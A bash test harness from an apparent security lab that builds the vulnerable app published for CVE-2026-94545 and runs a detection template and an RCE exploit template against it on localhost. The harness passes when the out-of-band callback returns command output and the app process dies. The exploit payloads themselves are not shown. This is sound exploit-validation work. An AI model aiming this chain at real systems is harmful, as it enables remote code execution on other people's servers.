#!/usr/bin/env bash
# Build the app published in EQSTLab/CVE-2026-94545 and run both templates
# against it, with the same harness the lab suite uses.
#
# This is the strongest form of the fidelity question: not "does our copy of the
# route behave the same" (that is check-upstream.sh) but "do the templates work
# against the advisory's own source".
#
# What it does
#   1. clones the advisory repository (or reuses --repo DIR)
#   2. builds app/ into run/upstream with the lab's Node 24.20.0 (the non-PIE
#      build the gadget addresses belong to) if it is not already built
#   3. starts it on --port (default 3002) with an OOB listener
#   4. runs the detection template  -> expects a match
#   5. runs the exploit template with a local callback -> expects a callback and
#      a dead process, then restarts the app so it is left running
#
# Usage: ./test-upstream-app.sh [--port 3002] [--repo DIR|URL] [--skip-build]
set -uo pipefail

LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
NODE_BIN="$LAB_DIR/.runtime/node/bin/node"
NODE_DIR="$LAB_DIR/.runtime/node/bin"
SHIM="$LAB_DIR/tools/nuclei-shim.mjs"
DETECT="$LAB_DIR/../CVE-2026-94545.yaml"
RCE="$LAB_DIR/../CVE-2026-94545-rce.yaml"
REPO_URL="https://github.com/EQSTLab/CVE-2026-94545.git"

PORT=3002
OOB_PORT=4445
REPO=""
SKIP_BUILD=0

while [ $# -gt 0 ]; do
  case "$1" in
    --port)       PORT="${2:?}"; shift 2 ;;
    --oob-port)   OOB_PORT="${2:?}"; shift 2 ;;
    --repo)       REPO="${2:?}"; shift 2 ;;
    --skip-build) SKIP_BUILD=1; shift ;;
    -h|--help)    sed -n '2,22p' "${BASH_SOURCE[0]}" | sed 's/^# \{0,1\}//'; exit 0 ;;
    *) echo "unknown option: $1" >&2; exit 2 ;;
  esac
done

c_red=$'\033[1;31m'; c_green=$'\033[1;32m'; c_blue=$'\033[1;34m'; c_dim=$'\033[2m'; c_off=$'\033[0m'
log()  { printf '%s[upstream]%s %s\n' "$c_blue" "$c_off" "$*"; }
die()  { printf '%s[upstream]%s %s\n' "$c_red" "$c_off" "$*" >&2; exit 1; }

PASS=0; FAIL=0
ok()   { PASS=$((PASS+1)); printf '  %sPASS%s %s  %s(%s)%s\n' "$c_green" "$c_off" "$1" "$c_dim" "${2:-}" "$c_off"; }
bad()  { FAIL=$((FAIL+1)); printf '  %sFAIL%s %s  %s\n' "$c_red" "$c_off" "$1" "${2:-}"; }

[ -x "$NODE_BIN" ] || die "node runtime missing - run ./setup.sh first (or fetch it as setup.sh does)"
command -v npm >/dev/null 2>&1 || die "npm is required to install the app dependencies"

# ------------------------------------------------------------------ 1. source
if [ -n "$REPO" ] && [ -d "$REPO/app" ]; then
  SRC="$REPO"
  log "using local repository $SRC"
else
  SRC="$LAB_DIR/.upstream"
  if [ -d "$SRC/app" ]; then
    log "reusing the clone in $SRC"
  else
    log "cloning ${REPO:-$REPO_URL}"
    rm -rf "$SRC"
    git clone --depth 1 -q "${REPO:-$REPO_URL}" "$SRC" || die "clone failed"
  fi
fi
[ -f "$SRC/app/app/api/og/route.jsx" ] || die "no app/app/api/og/route.jsx in $SRC"

# ------------------------------------------------------------------- 2. build
APP_DIR="$LAB_DIR/run/upstream"
if [ "$SKIP_BUILD" = "1" ] && [ -d "$APP_DIR/node_modules" ]; then
  log "reusing the existing build in run/upstream (--skip-build)"
else
  log "building the upstream app into run/upstream (next build, ~30s)"
  rm -rf "$APP_DIR"
  mkdir -p "$LAB_DIR/run"
  cp -r "$SRC/app" "$APP_DIR"
  ( cd "$APP_DIR" && npm install --no-audit --no-fund --silent ) || die "npm install failed"
  ( cd "$APP_DIR" && PATH="$NODE_DIR:$PATH" NEXT_TELEMETRY_DISABLED=1 "$NODE_BIN" ./node_modules/next/dist/bin/next build >/dev/null ) ||
    die "next build failed"
fi

# ------------------------------------------------------------------- 3. start
pids=()
cleanup() {
  for pid in "${pids[@]:-}"; do kill "$pid" 2>/dev/null || true; done
}
trap cleanup EXIT

start_app() {
  # setsid --fork detaches completely: the script can exit without waiting on it
  ( cd "$APP_DIR" && NEXT_TELEMETRY_DISABLED=1 PATH="$NODE_DIR:$PATH" \
      nohup setsid --fork "$NODE_BIN" ./node_modules/next/dist/bin/next start -H 0.0.0.0 -p "$PORT" \
      >"$LAB_DIR/logs/upstream.log" 2>&1 </dev/null & )
  disown -a 2>/dev/null || true
  local deadline=$(( $(date +%s) + 40 ))
  while [ "$(date +%s)" -lt "$deadline" ]; do
    curl -fsS -m 3 -o /dev/null "http://127.0.0.1:$PORT/api/og?value=ready" 2>/dev/null && return 0
    sleep 0.5
  done
  return 1
}

mkdir -p "$LAB_DIR/logs"
log "starting the upstream app on :$PORT"
start_app || die "the app did not answer on :$PORT (see logs/upstream.log)"
ok "upstream app serves /api/og on :$PORT"

# the app dies with the worker, so remember how to bring it back
app_alive() { curl -fsS -m 5 -o /dev/null "http://127.0.0.1:$PORT/api/og?value=x" 2>/dev/null; }

OOB_LOG="$LAB_DIR/oob-upstream-app.log"
: >"$OOB_LOG"
nohup setsid --fork python3 "$LAB_DIR/oob-listener.py" --host 0.0.0.0 --port "$OOB_PORT" --log "$OOB_LOG" \
  >"$LAB_DIR/logs/upstream-oob.log" 2>&1 </dev/null &
disown -a 2>/dev/null || true
sleep 1
log "OOB listener on :$OOB_PORT"

# --------------------------------------------------------------- 4. detection
log "detection template against the upstream app"
detect_out="$(node "$SHIM" "$DETECT" "127.0.0.1:$PORT" --print-response --quiet 2>&1)"
detect_rc=$?
printf '%s\n' "$detect_out" | sed 's/^/    /'
if [ "$detect_rc" = "0" ] && printf '%s' "$detect_out" | grep -q 'NEXTJS_OG_XINCLUDE_REACHABLE'; then
  ok "detection matches the upstream app" "$(printf '%s' "$detect_out" | grep -oE 'probe=[0-9]+B control=[0-9]+B ratio=[0-9.]+')"
else
  bad "detection did not match the upstream app"
fi

# ------------------------------------------------------------------ 5. exploit
log "exploit template against the upstream app (local callback)"
rce_out="$(node "$SHIM" "$RCE" "127.0.0.1:$PORT" --var "oast=127.0.0.1:$OOB_PORT" \
  --oob-log "$OOB_LOG" --print-response --quiet 2>&1)"
rce_rc=$?
printf '%s\n' "$rce_out" | grep -o 'payload sent to.*' | sed 's/^/    /'
# the shim exits 0 when the template matched (callback seen), 3 when not
if [ "$rce_rc" = "0" ]; then
  ok "exploit matched (shim verdict: matched)"
else
  bad "exploit did not match" "(shim exit $rce_rc, no callback on :$OOB_PORT)"
fi
sleep 1
if grep -q 'uid=' "$OOB_LOG"; then
  ok "callback carried the command output" "$(sed 's/.*data=//' "$OOB_LOG" | head -1)"
else
  bad "no command output recorded in $OOB_LOG"
fi
if app_alive; then
  bad "upstream app survived the payload" "(expected the worker to be replaced)"
else
  ok "upstream app process was replaced by the chain"
  log "restarting the upstream app"
  start_app && ok "upstream app serves again on :$PORT" || bad "could not restart the app"
fi

log "summary: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
